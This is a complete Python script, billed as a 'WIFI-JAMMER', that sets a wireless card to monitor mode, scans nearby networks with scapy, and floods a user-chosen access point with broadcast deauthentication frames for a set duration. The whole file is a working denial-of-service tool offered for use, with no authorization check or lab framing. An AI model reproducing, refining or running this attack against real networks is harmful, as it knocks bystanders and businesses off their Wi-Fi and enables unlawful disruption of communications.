#!/usr/bin/env python3
import os
import re
import sys
import time
import shutil
import subprocess
from scapy.all import (RadioTap, Dot11, Dot11Deauth, sendp, sniff, 
                      Dot11Beacon, Dot11Elt, conf)
from scapy.error import Scapy_Exception

# Colors
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
RESET = "\033[0m"

def check_dependencies():
    """Verify required tools are installed"""
    missing = []
    
    # Check scapy
    try:
        import scapy
    except ImportError:
        missing.append("scapy (pip install scapy)")
    
    # Check iwconfig and iwlist
    if not shutil.which('iwconfig'):
        missing.append("wireless-tools (apt install wireless-tools)")
    if not shutil.which('iwlist'):
        missing.append("wireless-tools (apt install wireless-tools)")
    
    if missing:
        print(f"{RED}[-] Missing dependencies:{RESET}")
        for dep in missing:
            print(f"  - {dep}")
        sys.exit(1)

def display_ascii_art():
    """Show styled title"""
    try:
        art = subprocess.run(
            ['toilet', '-f', 'bigmono9', '-w', '100', 'WIFI-JAMMER'],
            capture_output=True, text=True
        ).stdout
        print(f"{GREEN}{art}{RESET}")
    except:
        print(f"{GREEN}\n  WIFI JAMMER\n{RESET}")
    # Print credentials outside the try-except block
    print(f"\n{BLUE}Author: https://github.com/dy-glitch | Instagram: @gangnapper{RESET}\n")

def get_wireless_interfaces():
    """Get available wireless interfaces"""
    interfaces = []
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        interfaces = [line.split()[0] 
                     for line in result.stdout.splitlines() 
                     if "IEEE 802.11" in line]
    except Exception as e:
        print(f"{RED}[-] Error detecting interfaces: {e}{RESET}")
    return interfaces

def set_monitor_mode(interface):
    """Configure interface in monitor mode"""
    print(f"{YELLOW}[*] Configuring {interface}...{RESET}")
    
    # First try to use airmon-ng if available
    if shutil.which('airmon-ng'):
        try:
            subprocess.run(["sudo", "airmon-ng", "start", interface], 
                         check=True, stderr=subprocess.DEVNULL)
            # Airmon changes the interface name usually
            new_iface = f"{interface}mon"
            if os.path.exists(f"/sys/class/net/{new_iface}"):
                return new_iface
        except:
            pass
    
    # Fallback to manual method
    commands = [
        ["ifconfig", interface, "down"],
        ["iwconfig", interface, "mode", "monitor"],
        ["ifconfig", interface, "up"]
    ]
    
    for cmd in commands:
        try:
            subprocess.run(["sudo"] + cmd, check=True)
        except subprocess.CalledProcessError as e:
            print(f"{RED}[-] Failed: {' '.join(cmd)} - {e}{RESET}")
            return False
    
    # Verify mode
    result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
    if "Mode:Monitor" in result.stdout:
        print(f"{GREEN}[+] {interface} in monitor mode{RESET}")
        return interface
    else:
        print(f"{RED}[-] Failed to set monitor mode{RESET}")
        return False

def get_available_channels(interface):
    """Get available channels for the interface"""
    try:
        result = subprocess.run(["iwlist", interface, "channel"], 
                              capture_output=True, text=True)
        channels = []
        for line in result.stdout.splitlines():
            match = re.search(r'Channel (\d+)', line)
            if match:
                channels.append(int(match.group(1)))
        return channels if channels else list(range(1, 14))  # Default to 2.4GHz
    except:
        return list(range(1, 14))  # Default to 2.4GHz

def set_channel(interface, channel):
    """Set interface channel"""
    try:
        subprocess.run(["iwconfig", interface, "channel", str(channel)],
                      check=True, stderr=subprocess.DEVNULL)
    except:
        pass

def get_current_channel(interface):
    """Get current channel of interface"""
    try:
        result = subprocess.run(["iwconfig", interface],
                              capture_output=True, text=True)
        match = re.search(r'Channel:(\d+)', result.stdout)
        return int(match.group(1)) if match else None
    except:
        return None

def scan_networks(interface, duration=15):
    """Scan for nearby WiFi networks with channel hopping"""
    networks = {}
    print(f"{YELLOW}[*] Scanning for {duration}s (with channel hopping)...{RESET}")

    # Get available channels
    channels = get_available_channels(interface)
    if not channels:
        channels = list(range(1, 14))  # Default to 2.4GHz channels
    
    time_per_channel = max(1, duration // len(channels))
    
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            try:
                bssid = pkt[Dot11].addr2
                ssid_element = pkt.getlayer(Dot11Elt, ID=0)
                ssid = ssid_element.info.decode('utf-8', 'ignore') if ssid_element else "<hidden>"
                
                # Get signal strength
                rssi = None
                if hasattr(pkt, 'dBm_AntSignal'):
                    rssi = pkt.dBm_AntSignal
                elif 'notdecoded' in pkt:
                    rssi = -(256 - ord(pkt.notdecoded[-4:-3]))
                
                # Get channel
                channel = None
                if hasattr(pkt, 'ChannelFrequency'):
                    freq = pkt.ChannelFrequency
                    if 2412 <= freq <= 2484:  # 2.4GHz
                        channel = (freq - 2412) // 5 + 1
                    elif 5170 <= freq <= 5825:  # 5GHz
                        channel = (freq - 5170) // 5 + 34
                
                # Fallback to channel from beacon
                if channel is None:
                    channel_element = pkt.getlayer(Dot11Elt, ID=3)
                    if channel_element:
                        channel = int(ord(channel_element.info))
                
                # Get encryption type
                encryption = "Open"
                if pkt.haslayer(Dot11Elt):
                    for elt in pkt[Dot11Elt]:
                        if elt.ID == 48:  # RSN Information
                            encryption = "WPA2"
                        elif elt.ID == 221 and "WPA" in str(elt):
                            encryption = "WPA"
                
                if bssid not in networks or (isinstance(rssi, (int, float)) and 
                   (not isinstance(networks[bssid]['dbm'], (int, float)) or 
                   rssi > networks[bssid]['dbm'])):
                    networks[bssid] = {
                        'ssid': ssid,
                        'dbm': rssi,
                        'channel': channel or "unknown",
                        'encryption': encryption
                    }
            except Exception as e:
                pass

    # Save current channel to restore later
    original_channel = get_current_channel(interface)
    
    try:
        for channel in channels:
            set_channel(interface, channel)
            sniff(iface=interface, 
                 prn=packet_handler, 
                 timeout=time_per_channel,
                 store=0)
    except Scapy_Exception as e:
        print(f"{RED}[-] Scapy error: {e}{RESET}")
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan interrupted{RESET}")
    finally:
        # Restore original channel
        if original_channel:
            set_channel(interface, original_channel)
    
    return networks

def deauth_target(interface, target_bssid, count=10, interval=0.1, duration=30):
    """Launch deauthentication attack"""
    print(f"{YELLOW}[*] Targeting {target_bssid}{RESET}")
    
    # Set to target channel first
    networks = scan_networks(interface, duration=5)  # Quick rescan
    if target_bssid in networks:
        channel = networks[target_bssid]['channel']
        if isinstance(channel, int):
            set_channel(interface, channel)
    
    # Target all clients (broadcast)
    packet = RadioTap() / Dot11(
        addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
        addr2=target_bssid,          # AP MAC
        addr3=target_bssid            # AP MAC
    ) / Dot11Deauth(reason=7)         # 7 = Class 3 frame received from nonassociated STA
    
    start_time = time.time()
    sent_packets = 0
    try:
        while time.time() - start_time < duration:
            sendp(packet, iface=interface, count=count, inter=interval, verbose=False)
            sent_packets += count
            print(f"{GREEN}[+] Sent {count} deauth packets (Total: {sent_packets}){RESET}", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Stopped attack{RESET}")
    except Exception as e:
        print(f"\n{RED}[-] Error: {e}{RESET}")
    finally:
        print(f"\n{GREEN}[+] Attack completed. Total packets sent: {sent_packets}{RESET}")

def main():
    check_dependencies()
    display_ascii_art()
    
    # Get interfaces
    interfaces = get_wireless_interfaces()
    if not interfaces:
        print(f"{RED}[-] No wireless interfaces found{RESET}")
        sys.exit(1)
    
    # Interface selection
    print(f"{GREEN}[+] Available interfaces:{RESET}")
    for i, iface in enumerate(interfaces):
        print(f"  {i+1}. {iface}")
    
    try:
        choice = int(input(f"{YELLOW}[?] Select interface: {RESET}")) - 1
        iface = interfaces[choice]
    except (ValueError, IndexError):
        print(f"{RED}[-] Invalid selection{RESET}")
        sys.exit(1)
    
    # Set monitor mode
    monitor_iface = set_monitor_mode(iface)
    if not monitor_iface:
        sys.exit(1)
    
    # Network scan
    print(f"\n{YELLOW}[*] Starting network scan...{RESET}")
    networks = scan_networks(monitor_iface, duration=20)
    
    if not networks:
        print(f"{RED}[-] No networks found{RESET}")
        sys.exit(1)
    
    print(f"\n{GREEN}[+] Discovered networks (sorted by signal strength):{RESET}")
    sorted_networks = sorted(
        networks.items(),
        key=lambda x: x[1]['dbm'] if isinstance(x[1]['dbm'], (int, float)) else -100,
        reverse=True
    )
    
    for i, (bssid, info) in enumerate(sorted_networks):
        signal = f"{info['dbm']} dBm" if isinstance(info['dbm'], (int, float)) else "N/A"
        print(f"  {i+1}. {info['ssid']} ({bssid})")
        print(f"     Channel: {info['channel']} | Signal: {signal} | Encryption: {info['encryption']}")
    
    # Target selection
    try:
        target = input(f"\n{YELLOW}[?] Enter target BSSID (or number from list): {RESET}").strip()
        
        # Allow selection by number
        if target.isdigit():
            num = int(target) - 1
            if 0 <= num < len(sorted_networks):
                target = sorted_networks[num][0]
            else:
                print(f"{RED}[-] Invalid selection{RESET}")
                sys.exit(1)
        
        if target not in networks:
            print(f"{RED}[-] Invalid BSSID{RESET}")
            sys.exit(1)
            
        # Duration selection
        try:
            duration = int(input(f"{YELLOW}[?] Enter attack duration in seconds (default 30): {RESET}") or 30)
        except ValueError:
            duration = 30
            
    except KeyboardInterrupt:
        sys.exit(0)
    
    # Launch attack
    try:
        deauth_target(monitor_iface, target, duration=duration)
    except PermissionError:
        print(f"{RED}[-] Need root privileges!{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"{RED}[-] Run as root!{RESET}")
        sys.exit(1)
    main()
           
